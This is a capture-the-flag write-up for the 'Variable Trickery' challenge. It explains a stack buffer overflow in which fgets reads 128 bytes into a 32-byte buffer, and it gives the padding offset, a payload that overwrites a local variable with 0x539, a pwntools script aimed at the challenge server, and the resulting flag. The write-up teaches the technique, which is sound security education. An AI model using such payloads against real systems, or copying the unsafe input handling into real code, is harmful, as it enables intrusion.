# Variable Trickery – Binary Exploitation Challenge Write-up

## Challenge Overview

**Challenge Name:** Variable Trickery  
**Category:** Binary Exploitation (Buffer Overflow)  
**File:** variable_trickery  
**Host:** `nc 20.193.151.106 5003`  
**Objective:** Exploit a vulnerable binary to gain access to the flag.

---

## Vulnerability Analysis

The binary contains a vulnerable function `vuln()` that looks like this (decompiled from Ghidra):

```c
void vuln(void) {
    char name[32];
    int access;

    puts("What's your name?");
    fgets(name, 0x80, stdin);  // Vulnerability: buffer overflow
    printf("Hello %sBut you can't see the flag yet.\n", name);

    if (access == 0x539) {
        win();  // Secret function that reveals the flag
    }
}
```
---

## Key Issues:
> name is a 32-byte buffer.  
> fgets() reads up to 128 bytes, allowing us to overwrite memory beyond name.  
> The access variable is located right after the name buffer on the stack.  
> By overflowing name, we can overwrite access with the magic value 0x539 (1337) and trigger the call to win().

---
## Exploitation Strategy

Stack Layout
```pgsql
| name[32 bytes]        |
| padding (12 bytes)    |  <-- to align with access
| access (4 bytes)      |  <-- target to overwrite with 0x539
```
---
## Exploit Payload Construction
To reach and overwrite access:

```python
payload = b"A" * 44             # 32 bytes buffer + 12 bytes padding
payload += p32(0x539)           # Overwrite access with 1337
```

---

## Exploit Script (Python + pwntools)

```python
from pwn import *

# Connect to the remote challenge
conn = remote("20.193.151.106", 5003)

# Construct payload
payload = b"A" * 44
payload += p32(0x539)

# Send payload
conn.sendline(payload)

# Receive and print the output
print(conn.recvall().decode())
```

---

## Flag
Upon successful execution, we receive:

```rust
Congratulations! Here's your flag: CSAY{vars_are_meant_to_be_broken}
```

---

## Takeaway
This challenge demonstrates a classic stack-based buffer overflow caused by unsafe input handling with fgets(). Even in modern binaries, simple memory layout assumptions can be exploited if proper bounds checking is not enforced.

## Tools Used
Ghidra & Binary Ninja (for static analysis)

pwntools (for exploit scripting)

objdump, gdb, and xxd (for inspection and testing)